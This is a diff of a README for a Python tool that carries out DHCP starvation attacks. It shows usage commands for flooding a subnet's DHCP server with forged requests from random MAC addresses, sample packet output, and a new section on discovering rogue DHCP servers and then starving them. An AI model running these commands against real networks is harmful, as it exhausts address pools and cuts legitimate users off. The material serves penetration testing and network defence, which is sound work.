@@ -19,7 +19,7 @@ It works better with python2
 ````
 usage: starvit.py [-h] -subnet SUBNET [-start N] [-end N]
                   [-server_id SERVER_ID] [-random_hostnames]
-                  [-dst_mac DST_MAC] [-timeout TIMEOUT] [-debug DEBUG]
+                  [-dst_mac DST_MAC] [-timeout TIMEOUT] [-debug]
 
 
 sudo python starvit.py -subnet 192.168.27. -start 120 -end 150
@@ -28,10 +28,12 @@ sudo python starvit.py -subnet 192.168.27. -start 120 -end 150
 sudo python starvit.py -subnet 192.168.27. -start 10 -end 253 -server_id 192.168.27.254
 
 # specify server by its MAC address and print packets to stdout
-python starvit.py -subnet 192.168.1. -start 80 -end 100 -dst_mac 08:00:27:7C:F9:41 -debug 1
+python starvit.py -subnet 192.168.1. -start 80 -end 100 -dst_mac 08:00:27:7C:F9:41 -debug
+
+
 ````
 
-#### example stdout with -debug 1
+#### example stdout with -debug option
 ````
 Requesting: 192.168.1.98
 <Ether  dst=08:00:27:7C:F9:41 src=7b:7b:d1:5a:6b:62 type=IPv4 |<IP  frag=0 proto=udp src=0.0.0.0 dst=255.255.255.255 |<UDP  sport=bootpc dport=bootps |<BOOTP  chaddr=<RandMAC> options='c\x82Sc' |<DHCP  options=[message-type='request' requested_addr=192.168.1.98 end] |>>>>>
@@ -54,10 +56,30 @@ python release_ip.py -src_mac 66:36:3a:37:31:3a -src_ip 192.168.1.93 -dst_mac 08
 
 ````
 
+### Send a DHCP discover and listen for event
+A listener could be also executed to run a function callback for every packet sniffed.
+For example we could send a gratuitous DHCP DISCOVER to sniff DHCP OFFER from rogue DHCP servers, then run a starvation over them.
+
+````
+# DHCP DISCOVER
+python2 dhcp_discover.py -i eth2
+
+# DHCP event listener
+python listener.py -i eth2 [-debug]
+
+Start DHCP listener on interface 'eth2' with filter 'port 68 and port 67'
+DHCP OFFER from: 10.21.0.254 [d4:ca:6d:e6:6a:d7]
+DHCP OFFER from: 192.168.1.1 [08:00:27:7c:f9:41]
+DHCP OFFER from: 192.168.1.1 [08:00:27:7c:f9:41]
+````
+
 ### Results
 ![example](images/example.png)
 An OpenWRT DHCP server used as victim.
-Someone fake client request was forged with "-random_hostnames" option, someone not.
+Some fake client requests was forged with "-random_hostnames" option, some other not.
+
+![discover](images/discover2.png)
+Server side effects of DHCP Discovery, dhcp_discover.py will always use a fake mac address to run its inspections.
 
 ### Hints
 ````
